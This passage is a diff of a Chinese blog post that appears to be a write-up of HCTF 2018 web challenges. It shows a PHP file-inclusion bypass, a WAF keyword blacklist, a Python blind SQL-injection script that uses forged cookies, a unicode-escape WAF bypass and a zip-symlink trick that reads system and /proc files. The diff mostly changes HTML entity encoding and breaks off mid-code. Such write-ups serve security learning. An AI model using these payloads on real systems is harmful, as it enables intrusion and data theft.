@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>HCTF 2018 web 部分题目 详细 writeup | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/6.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="/css/main.css?v=1.0.4"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body style="background:#fbfbfb;"><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">HCTF 2018 web 部分题目 详细 writeup</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/rss/"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">HCTF 2018 web 部分题目 详细 writeup</h1><div class="post-meta">Nov 20, 2018<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>每年 HCTF 都收获颇丰，今年又在 L-team 队友们的帮助下学到了很多东西，记录一下，还是太菜了，要多学习才行，还有就是不要偷懒，多多尝试和研究，偷懒是一个人走向失败的开始。</p>
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>HCTF 2018 web 部分题目 详细 writeup | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">HCTF 2018 web 部分题目 详细 writeup</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">HCTF 2018 web 部分题目 详细 writeup</h1><div class="post-meta">Nov 20, 2018<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-warmup"><span class="toc-number">2.</span> <span class="toc-text">0X01 warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-Kzone"><span class="toc-number">3.</span> <span class="toc-text">0X02 Kzone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-hide-and-seek"><span class="toc-number">4.</span> <span class="toc-text">0X03 hide_and_seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-admin"><span class="toc-number">5.</span> <span class="toc-text">0X04 admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-GAME"><span class="toc-number">6.</span> <span class="toc-text">0X05 GAME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-bottle"><span class="toc-number">7.</span> <span class="toc-text">0X06 bottle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X07-参考"><span class="toc-number">8.</span> <span class="toc-text">0X07 参考</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>每年 HCTF 都收获颇丰，今年又在 L-team 队友们的帮助下学到了很多东西，记录一下，还是太菜了，要多学习才行，还有就是不要偷懒，多多尝试和研究，偷懒是一个人走向失败的开始。</p>
 <h2 id="0X01-warmup"><a href="#0X01-warmup" class="headerlink" title="0X01 warmup"></a><strong>0X01 warmup</strong></h2><p>热身题，hint 页面存在一个文件包含，还告诉了 flag 的文件名</p>
 <p><strong>如图所示：</strong></p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20warmup1.png" alt="此处输入图片的描述"></p>
@@ -15,7 +15,7 @@
         {
             $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
             if (! isset($page) || !is_string($page)) {
-                echo &quot;you can&apos;t see it&quot;;
+                echo &quot;you can&#39;t see it&quot;;
                 return false;
             }
 
@@ -26,7 +26,7 @@
             $_page = mb_substr(
                 $page,
                 0,
-                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
+                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
             );
             if (in_array($_page, $whitelist)) {
                 return true;
@@ -36,48 +36,48 @@
             $_page = mb_substr(
                 $_page,
                 0,
-                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
+                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
             );
             if (in_array($_page, $whitelist)) {
                 return true;
             }
-            echo &quot;you can&apos;t see it&quot;;
+            echo &quot;you can&#39;t see it&quot;;
             return false;
         }
     }
 
-    if (! empty($_REQUEST[&apos;file&apos;])
-        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
-        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
+    if (! empty($_REQUEST[&#39;file&#39;])
+        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
     ) {
-        include $_REQUEST[&apos;file&apos;];
+        include $_REQUEST[&#39;file&#39;];
         exit;
     } else {
         echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
     }  
 ?&gt;
 </code></pre><p>重点逻辑在这里</p>
-<pre><code>if (! empty($_REQUEST[&apos;file&apos;])
-    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
-    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
-) {
-    include $_REQUEST[&apos;file&apos;];
-    exit;
-} else {
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-}  
+<pre><code>    if (! empty($_REQUEST[&#39;file&#39;])
+        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+    ) {
+        include $_REQUEST[&#39;file&#39;];
+        exit;
+    } else {
+        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+    }  
 </code></pre><p>我们只要满足下面这个为真，并且让 file 成为我们的 flag 就行了</p>
-<pre><code>emmm::checkFile($_REQUEST[&apos;file&apos;]
+<pre><code>    emmm::checkFile($_REQUEST[&#39;file&#39;]
 </code></pre><p>因为这部分有个 url 解码</p>
-<pre><code>$_page = urldecode($page);
-$_page = mb_substr(
-    $_page,
-    0,
-    mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-);
-if (in_array($_page, $whitelist)) {
-    return true;
-}
+<pre><code>    $_page = urldecode($page);
+    $_page = mb_substr(
+        $_page,
+        0,
+        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+    );
+    if (in_array($_page, $whitelist)) {
+        return true;
+    }
 </code></pre><p>猜想可能本身服务端对客户端传过去的东西没有过解码，%3a 不会被转换成 ？于是就能利用跨目录的方法</p>
 <p><strong>如图所示：</strong></p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20warmup3.png" alt="此处输入图片的描述"></p>
@@ -85,23 +85,23 @@ if (in_array($_page, $whitelist)) {
 <pre><code>&lt;?php
 include(&quot;../include/common.php&quot;);
 if ($islogin == 1) {
-} else exit(&quot;&lt;script language=&apos;javascript&apos;&gt;window.location.href=&apos;./login.php&apos;;&lt;/script&gt;&quot;);
+} else exit(&quot;&lt;script language=&#39;javascript&#39;&gt;window.location.href=&#39;./login.php&#39;;&lt;/script&gt;&quot;);
 ?&gt;
 </code></pre><p>判断的逻辑是</p>
 <pre><code>&lt;?php
-if (!defined(&apos;IN_CRONLITE&apos;)) exit();
+if (!defined(&#39;IN_CRONLITE&#39;)) exit();
 $islogin = 0;
 if (isset($_COOKIE[&quot;islogin&quot;])) {
     if ($_COOKIE[&quot;login_data&quot;]) {
-        $login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);
-        $admin_user = $login_data[&apos;admin_user&apos;];
-        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);
-        if ($udata[&apos;username&apos;] == &apos;&apos;) {
+        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
+        $admin_user = $login_data[&#39;admin_user&#39;];
+        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
+        if ($udata[&#39;username&#39;] == &#39;&#39;) {
             setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
             setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
         }
-        $admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);
-        if ($admin_pass == $login_data[&apos;admin_pass&apos;]) {
+        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+        if ($admin_pass == $login_data[&#39;admin_pass&#39;]) {
             $islogin = 1;
         } else {
             setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
@@ -110,12 +110,12 @@ if (isset($_COOKIE[&quot;islogin&quot;])) {
     }
 }
 </code></pre><p>可以看到</p>
-<pre><code>$login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);
-$admin_user = $login_data[&apos;admin_user&apos;];
-$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);
+<pre><code>$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
+$admin_user = $login_data[&#39;admin_user&#39;];
+$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
 ...
-$admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);
-if ($admin_pass == $login_data[&apos;admin_pass&apos;]) {
+$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+if ($admin_pass == $login_data[&#39;admin_pass&#39;]) {
     $islogin = 1;
 </code></pre><p><code>$admin_pass</code> 是从数据库查出来的，不过进行了 sha1 编码， <code>$login_data[&#39;admin_pass&#39;]</code> 是从 cookie 中得到的，我们可控，并且中间用的是 == ，也就是存在弱类型绕过漏洞，由于无法确定 admin 的密码在 sha1 后的结果是什么，我们需要对其前面几个字符爆破</p>
 <p><strong>如图所示：</strong></p>
@@ -123,27 +123,27 @@ if ($admin_pass == $login_data[&apos;admin_pass&apos;]) {
 <p>然后浏览器设置 cookie 为这个值就能访问所有页面了，登进去以后就是列用户、改密码、删除用户、的页面，没什么太多功能，基本将后面的步骤锁定成对 admin 表的注入，毕竟之前看到的 blacklist 过滤的东西不是特别的多，还比较有机会成功。</p>
 <p>比较了一下 where 可控(毕竟我们要子查询)，并且没有对 单引号进行过滤的有三处，那就是 delete.php export.php 和 member.php </p>
 <p><strong>export.php</strong> </p>
-<pre><code>$zhi = $_GET[&apos;id&apos;];
-if ($zhi == &apos;&apos;) {
-    exit(&apos;id error！&apos;);
+<pre><code>$zhi = $_GET[&#39;id&#39;];
+if ($zhi == &#39;&#39;) {
+    exit(&#39;id error！&#39;);
 }
 $sql = &quot;select * from fish_user where id in($zhi);&quot;;
 $update = &quot;update fish_user set output=1 where id in($zhi);&quot;;
 </code></pre><p><strong>delete.php</strong>  </p>
-<pre><code>$zhi=$_GET[&apos;id&apos;];
+<pre><code>$zhi=$_GET[&#39;id&#39;];
 $sql=&quot;delete from fish_user where id in($zhi);&quot;;
 </code></pre><p><strong>member.php</strong></p>
-<pre><code>$login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);
-$admin_user = $login_data[&apos;admin_user&apos;];
-$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);
+<pre><code>$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
+$admin_user = $login_data[&#39;admin_user&#39;];
+$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
 </code></pre><p>但是后来出题人把 delete.php 给删了，感觉意思是不希望在这个地方注入(应该不是预期解，出题人可能忘过滤了)，那后来就锁定了 mem ber.php 也就是说这是一个 cookie 注入，利用的就是刚刚构造好的 cookie </p>
 <p>我们看一下黑名单</p>
 <p><strong>blacklist</strong></p>
 <pre><code>function waf($string)
 {
-    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;;
+    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;
     return preg_replace_callback($blacklist, function ($match) {
-        return &apos;@&apos; . $match[0] . &apos;@&apos;;
+        return &#39;@&#39; . $match[0] . &#39;@&#39;;
     }, $string);
 }
 </code></pre><p><strong>从一下几个方面去看</strong></p>
@@ -171,45 +171,45 @@ cookies = {
 }
 
 
-# payload1 = &apos;&apos;&apos;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats))))and'1"}}&apos;&apos;&apos;
-# payload2 = &apos;&apos;&apos;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))^1)and'1"}}&apos;&apos;&apos;
+# payload1 = &#39;&#39;&#39;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats))))and'1"}}&#39;&#39;&#39;
+# payload2 = &#39;&#39;&#39;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(database_name))from(mysql.innodb_table_stats)))^1)and'1"}}&#39;&#39;&#39;
 
-# payload1 = &apos;&apos;&apos;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats))))and'1"}}&apos;&apos;&apos;
-# payload2 = &apos;&apos;&apos;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))^1)and'1"}}&apos;&apos;&apos;
+# payload1 = &#39;&#39;&#39;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats))))and'1"}}&#39;&#39;&#39;
+# payload2 = &#39;&#39;&#39;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(group_concat(table_name))from(mysql.innodb_table_stats)))^1)and'1"}}&#39;&#39;&#39;
 
-payload1 = &apos;&apos;&apos;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(f1a9)from(F1444g))))and'1"}}&apos;&apos;&apos;
-payload2 = &apos;&apos;&apos;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(f1a9)from(F1444g)))^1)and'1"}}&apos;&apos;&apos;
+payload1 = &#39;&#39;&#39;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(f1a9)from(F1444g))))and'1"}}&#39;&#39;&#39;
+payload2 = &#39;&#39;&#39;{{"admin_pass":65,"admin_user":"admin'and(locate('{}{}',(select(f1a9)from(F1444g)))^1)and'1"}}&#39;&#39;&#39;
 
 
 get = &quot;&quot;
 for i in xrange(50):
     for j in xrange(32,127):
         data = payload1.format(get,chr(j))
-        cookies[&apos;login_data&apos;] = data
+        cookies[&#39;login_data&#39;] = data
         r = requests.get(url,cookies = cookies)
-        if &apos;KK&apos; in r.content:
+        if &#39;KK&#39; in r.content:
             data = payload2.format(get,chr(j))
-            cookies[&apos;login_data&apos;] = data
+            cookies[&#39;login_data&#39;] = data
             r = requests.get(url,cookies = cookies)
-            if &apos;KK&apos; not in r.content:
+            if &#39;KK&#39; not in r.content:
                 get = get + chr(j)
                 print get
                 break
 </code></pre><p><strong>更新 ：11.21</strong> 有师傅私聊和我说，这道题的另一种非常巧妙的绕过方法，就是在下面这段代码的地方</p>
-<pre><code>$login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);
-$admin_user = $login_data[&apos;admin_user&apos;];
-$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);
+<pre><code>$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
+$admin_user = $login_data[&#39;admin_user&#39;];
+$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
 ...
-$admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);
-if ($admin_pass == $login_data[&apos;admin_pass&apos;]) {
+$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
+if ($admin_pass == $login_data[&#39;admin_pass&#39;]) {
     $islogin = 1;
 </code></pre><p>我们甚至可以直接在里面注入拿到 flag ，我们再回过头来看一下这道题的 waf 部分</p>
 <pre><code>&lt;?php
 function waf($string)
 {
-    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;;
+    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;
     return preg_replace_callback($blacklist, function ($match) {
-        return &apos;@&apos; . $match[0] . &apos;@&apos;;
+        return &#39;@&#39; . $match[0] . &#39;@&#39;;
     }, $string);
 }
 
@@ -236,10 +236,10 @@ unset($cplen, $key, $value);
 ?&gt;
 </code></pre><p>可以看到我们传入的 cookie 会被送到 safe() 函数里面，然后safe() 又调用了 waf()，那我们怎么绕过呢？你有没有发现我们传进来的 cookie 在判断前还经历了一个比较重要的步骤，json_decode() 而 json_decode 他的一个特性就是对传入的 unicode 值会进行还原，我们来做一个实验</p>
 <p><strong>test2.php</strong></p>
-<pre><code>$a = array(&apos;username&apos;=&gt;&apos;\u0061\u0064\u006d\u0069\u006e&apos;);
+<pre><code>$a = array(&#39;username&#39;=&gt;&#39;\u0061\u0064\u006d\u0069\u006e&#39;);
 echo json_encode($a);
 echo &quot;&lt;br&gt;&quot;;
-print_r(json_decode(&apos;{&quot;username&quot;:&quot;\\u0061\\u0064\\u006d\\u0069\\u006e&quot;}&apos;));
+print_r(json_decode(&#39;{&quot;username&quot;:&quot;\\u0061\\u0064\\u006d\\u0069\\u006e&quot;}&#39;));
 </code></pre><p><strong>结果：</strong></p>
 <pre><code>{&quot;username&quot;:&quot;\\u0061\\u0064\\u006d\\u0069\\u006e&quot;}
 stdClass Object ( [username] =&gt; admin ) 
@@ -260,7 +260,7 @@ stdClass Object ( [username] =&gt; admin )
 <pre><code>root@K0rz3n:~# ln -s /start.sh test
 root@K0rz3n:~# zip -y test.zip test
 </code></pre><p>得到</p>
-<pre><code>#! /usr/bin/env bash set -e # If there&apos;s a prestart.sh script in the /app directory, run it before starting PRE_START_PATH=/app/prestart.sh echo &quot;Checking for script in $PRE_START_PATH&quot; if [ -f $PRE_START_PATH ] ; then echo &quot;Running script $PRE_START_PATH&quot; source $PRE_START_PATH else echo &quot;There is no script $PRE_START_PATH&quot; fi # Start Supervisor, with Nginx and uWSGI exec /usr/bin/supervisord 
+<pre><code>#! /usr/bin/env bash set -e # If there&#39;s a prestart.sh script in the /app directory, run it before starting PRE_START_PATH=/app/prestart.sh echo &quot;Checking for script in $PRE_START_PATH&quot; if [ -f $PRE_START_PATH ] ; then echo &quot;Running script $PRE_START_PATH&quot; source $PRE_START_PATH else echo &quot;There is no script $PRE_START_PATH&quot; fi # Start Supervisor, with Nginx and uWSGI exec /usr/bin/supervisord 
 </code></pre><p>搜索了一下发现这是一个部署 python 应用程序的东西，比如使用 uWSGI+Nginx+Supervisor部署管理Django应用程序，也就是说存在 app 这个目录，顺势读一下 /app/main.py</p>
 <pre><code>from flask import Flask 
 app = Flask(__name__) 
@@ -271,7 +271,7 @@ return &quot;Hello World
 from Flask in a uWSGI Nginx Docker container with \ Python 3.6 (default)&quot; 
 
 if __name__ == &quot;__main__&quot;: 
-app.run(host=&apos;0.0.0.0&apos;, debug=True, port=80) 
+app.run(host=&#39;0.0.0.0&#39;, debug=True, port=80) 
 </code></pre><p>发现这个是默认的 flask 文件，但是已经把 docker 的信息显示出来了，uWSGI Nginx Docker，我们可以自己下载对应的 docker 玩一下，但是这也很明显发现了另一个问题，他应该是换了默认的 web 应用的文件位置，这个位置可以通过 uwsgi 看到，那么这就涉及到了查看当前运行进程的一些信息了，怎么查看呢？我们要用到虚文件系统 proc 了， 那我们读一下 /proc/self/environ 查看当前运行进程的环境变量吧(这里其实还有一种就是通过读 /proc/self/cmdline 查看当前进程的完整启动命令，也能获取一些 docker 的信息,后来看了飞猪的 wp 发现读日志也能获取很多有用的信息)</p>
 <pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
 SUPERVISOR_GROUP_NAME=uwsgi
@@ -322,89 +322,89 @@ import os
 random.seed(uuid.getnode()) 
 
 app =Flask(__name__) 
-app.config[&apos;SECRET_KEY&apos;] = str(random.random() *100) 
-app.config[&apos;UPLOAD_FOLDER&apos;] =&apos;./uploads&apos;
-app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 *1024 
-ALLOWED_EXTENSIONS = set([&apos;zip&apos;]) 
+app.config[&#39;SECRET_KEY&#39;] = str(random.random() *100) 
+app.config[&#39;UPLOAD_FOLDER&#39;] =&#39;./uploads&#39;
+app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 *1024 
+ALLOWED_EXTENSIONS = set([&#39;zip&#39;]) 
 
 def allowed_file(filename):
-    return &apos;.&apos; 
+    return &#39;.&#39; 
     in filename and\ 
-    filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS
+    filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
 
 
-@ app.route(&apos;/&apos;, methods = [&apos;GET&apos;]) 
+@ app.route(&#39;/&#39;, methods = [&#39;GET&#39;]) 
 def index():
-        error = request.args.get(&apos;error&apos;, &apos;&apos;) 
-        if (error ==&apos;1&apos;): 
-            session.pop(&apos;username&apos;, None) 
-            return render_template(&apos;index.html&apos;,forbidden = 1) 
-        if &apos;username&apos; in session: 
-            return render_template(&apos;index.html&apos;, user =session[&apos;username&apos;], flag =flag.flag)
+        error = request.args.get(&#39;error&#39;, &#39;&#39;) 
+        if (error ==&#39;1&#39;): 
+            session.pop(&#39;username&#39;, None) 
+            return render_template(&#39;index.html&#39;,forbidden = 1) 
+        if &#39;username&#39; in session: 
+            return render_template(&#39;index.html&#39;, user =session[&#39;username&#39;], flag =flag.flag)
         else :
-            return render_template(&apos;index.html&apos;)
+            return render_template(&#39;index.html&#39;)
 
-@ app.route(&apos;/login&apos;, methods = [&apos;POST&apos;]) 
+@ app.route(&#39;/login&#39;, methods = [&#39;POST&#39;]) 
 def login(): 
-    username =request.form[&apos;username&apos;] 
-    password =request.form[&apos;password&apos;]
-    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;: 
-        if (username ==&apos;admin&apos;): 
-            return redirect(url_for(&apos;index&apos;, error =1)) 
-        session[&apos;username&apos;] = username
-        return redirect(url_for(&apos;index&apos;))
+    username =request.form[&#39;username&#39;] 
+    password =request.form[&#39;password&#39;]
+    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;: 
+        if (username ==&#39;admin&#39;): 
+            return redirect(url_for(&#39;index&#39;, error =1)) 
+        session[&#39;username&#39;] = username
+        return redirect(url_for(&#39;index&#39;))
 
 
-@ app.route(&apos;/logout&apos;, methods = [&apos;GET&apos;]) 
+@ app.route(&#39;/logout&#39;, methods = [&#39;GET&#39;]) 
 def logout(): 
-    session.pop(&apos;username&apos;, None) 
-    return redirect(url_for(&apos;index&apos;))
+    session.pop(&#39;username&#39;, None) 
+    return redirect(url_for(&#39;index&#39;))
 
-@ app.route(&apos;/upload&apos;, methods = [&apos;POST&apos;]) 
+@ app.route(&#39;/upload&#39;, methods = [&#39;POST&#39;]) 
 
 def upload_file(): 
-    if &apos;the_file&apos; not in request.files: 
-        return redirect(url_for(&apos;index&apos;)) 
-        file =request.files[&apos;the_file&apos;]
-    if file.filename == &apos;&apos;: 
-        return redirect(url_for(&apos;index&apos;)) 
+    if &#39;the_file&#39; not in request.files: 
+        return redirect(url_for(&#39;index&#39;)) 
+        file =request.files[&#39;the_file&#39;]
+    if file.filename == &#39;&#39;: 
+        return redirect(url_for(&#39;index&#39;)) 
     if file and allowed_file (file.filename): 
         filename =secure_filename(file.filename) 
-        file_save_path =os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename) 
+        file_save_path =os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename) 
         if (os.path.exists(file_save_path)): 
-            return &apos;This file already exists&apos;
+            return &#39;This file already exists&#39;
     file.save(file_save_path)
 else :
-    return &apos;This file is not a zipfile&apos;
+    return &#39;This file is not a zipfile&#39;
 
 try: 
-    extract_path = file_save_path + &apos;_&apos; 
-    os.system(&apos;unzip -n &apos; + file_save_path +&apos; -d &apos; + extract_path) read_obj =os.popen(&apos;cat &apos; + extract_path +&apos;/*&apos;) 
+    extract_path = file_save_path + &#39;_&#39; 
+    os.system(&#39;unzip -n &#39; + file_save_path +&#39; -d &#39; + extract_path) read_obj =os.popen(&#39;cat &#39; + extract_path +&#39;/*&#39;) 
     file = read_obj.read() 
     read_obj.close() 
-    os.system(&apos;rm -rf &apos; + extract_path) 
+    os.system(&#39;rm -rf &#39; + extract_path) 
 except Exception as e:
     file = None 
     os.remove(file_save_path) 
     if (file !=None): 
-        if (file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1):
-            return redirect(url_for(&apos;index&apos;, error =1)) 
+        if (file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):
+            return redirect(url_for(&#39;index&#39;, error =1)) 
             return Response(file) 
 
-if __name__ ==&apos;__main__&apos;: 
+if __name__ ==&#39;__main__&#39;: 
 #app.run(debug = True) 
-app.run(host = &apos;127.0.0.1&apos;, debug =True, port = 10008)
+app.run(host = &#39;127.0.0.1&#39;, debug =True, port = 10008)
 </code></pre><p>重点看这部分代码</p>
-<pre><code>@ app.route(&apos;/&apos;, methods = [&apos;GET&apos;]) 
+<pre><code>@ app.route(&#39;/&#39;, methods = [&#39;GET&#39;]) 
 def index():
-        error = request.args.get(&apos;error&apos;, &apos;&apos;) 
-        if (error ==&apos;1&apos;): 
-            session.pop(&apos;username&apos;, None) 
